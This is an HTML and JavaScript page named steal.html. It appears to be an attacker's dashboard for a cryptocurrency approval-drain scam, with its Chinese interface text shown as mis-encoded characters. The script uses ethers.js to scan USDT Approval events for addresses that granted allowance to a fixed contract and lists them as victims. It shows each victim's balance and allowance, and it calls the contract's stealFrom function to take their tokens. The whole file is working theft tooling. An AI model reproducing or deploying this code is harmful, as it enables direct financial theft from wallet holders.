<!-- steal.html -->
<!DOCTYPE html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8">
  <title>ğŸ’ª æ”»æ“Šè€…æ“ä½œç•Œé¢ v3.2.5 (é…åˆæ–°åˆç´„)</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <style>
    body { font-family: Arial, sans-serif; padding: 40px; background: #fff; }
    .ok { color: green; }
    .bad { color: red; }
    input { padding: 5px; width: 380px; }
    button { padding: 6px 16px; margin-left: 8px; }
    #refresh { font-size: 12px; color: gray; }
    #victims li { margin-bottom: 4px; }
  </style>
</head>
<body>
  <h2>ğŸ’ª æ”»æ“Šè€…æ“ä½œç•Œé¢ v3.2.5 (é…åˆæ–°åˆç´„)</h2>
  <p><b>åˆç´„åœ°å€ï¼š</b><span id="contract">0xB72C785Bc1a80C37a12D43fc55FcF2Fe2168923e</span></p>
  <p><b>ç›®å‰ç™»å…¥å¸³è™Ÿï¼š</b><span id="account">æ­£åœ¨é€£ç·š...</span></p>
  <p><b>èº«ä»½é©—è­‰ï¼š</b><span id="auth" class="bad">æœªé©—è­‰</span></p>
  <input id="input" placeholder="å—å®³è€…åœ°å€" />
  <button onclick="steal()">åŸ·è¡Œç›œå–</button>
  <p id="balance"></p>
  <p id="status">ç­‰å¾…æ“ä½œ...</p>
  <p id="refresh"></p>
  <h3>ğŸ–Šï¸ æˆæ¬Šåœ°å€åˆ—è¡¨ï¼š</h3>
  <ul id="victims"></ul>

  <script>
    const CONTRACT = "0xB72C785Bc1a80C37a12D43fc55FcF2Fe2168923e";
    const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
    const ABI = [
      "event Approval(address indexed owner, address indexed spender, uint256 value)",
      "function balanceOf(address) view returns (uint256)",
      "function allowance(address owner, address spender) view returns (uint256)",
      "function stealFrom(address victim) external"
    ];

    let provider, signer, attacker;

    async function connect() {
      if (!window.ethereum) return alert("è«‹å®‰è£ MetaMask");
      provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      signer = provider.getSigner();
      attacker = await signer.getAddress();
      document.getElementById("account").innerText = attacker;
      document.getElementById("auth").innerText = "ä½ æ˜¯æ”»æ“Šè€…æœ¬äºº";
      document.getElementById("auth").className = "ok";
      fetchApprovals();
    }

    async function fetchApprovals() {
      document.getElementById("refresh").innerText = "â­ï¸ æ­£åœ¨æ·æ™‚æ›´æ–°æˆæ¬Šåˆ—è¡¨...";
      const contract = new ethers.Contract(USDT, ABI, provider);
      const events = await contract.queryFilter(contract.filters.Approval(null, CONTRACT), 19000000);
      const ul = document.getElementById("victims");
      ul.innerHTML = "";
      const seen = new Set();
      events.reverse().forEach(ev => {
        if (!seen.has(ev.args.owner)) {
          seen.add(ev.args.owner);
          const li = document.createElement("li");
          li.innerText = ev.args.owner;
          ul.appendChild(li);
        }
      });
      document.getElementById("refresh").innerText = "âœ… å·²æ›´æ–° " + new Date().toLocaleTimeString();
    }

    async function steal() {
      const victim = document.getElementById("input").value;
      if (!ethers.utils.isAddress(victim)) return alert("è«‹è¼¸å…¥åˆæ³•çš„åœ°å€");
      if (victim.toLowerCase() === attacker.toLowerCase()) {
        return document.getElementById("status").innerText = "â›”ï¸ ç„¡æ•ˆï¼šä¸å¯å°è‡ªå·±åŸ·è¡Œ";
      }
      const iface = new ethers.utils.Interface(["function stealFrom(address victim)"]);
      const data = iface.encodeFunctionData("stealFrom", [victim]);
      const tx = { to: CONTRACT, data };
      document.getElementById("status").innerText = "ğŸš€ å‘¼å« stealFrom(" + victim + ")...";
      try {
        const sent = await signer.sendTransaction(tx);
        document.getElementById("status").innerHTML = "<span class='ok'>âœ… TX Hash: <a href='https://etherscan.io/tx/" + sent.hash + "' target='_blank'>" + sent.hash + "</a></span>";
      } catch (e) {
        document.getElementById("status").innerHTML = "<span class='bad'>âŒ å¤±æ•—: " + e.message + "</span>";
      }
    }

    document.getElementById("input").addEventListener("input", async (e) => {
      const val = e.target.value;
      if (ethers.utils.isAddress(val)) {
        try {
          const contract = new ethers.Contract(USDT, ABI, provider);
          const balance = await contract.balanceOf(val);
          const allowance = await contract.allowance(val, CONTRACT);
          document.getElementById("balance").innerText = "ğŸ’µ USDT: " + balance.toString() + "\nğŸ—“ Allowance: " + allowance.toString();
        } catch {
          document.getElementById("balance").innerText = "âŒ æŸ¥è©¢å¤±æ•—";
        }
      } else {
        document.getElementById("balance").innerText = "";
      }
    });

    connect();
    setInterval(fetchApprovals, 15000);
  </script>
</body>
</html>
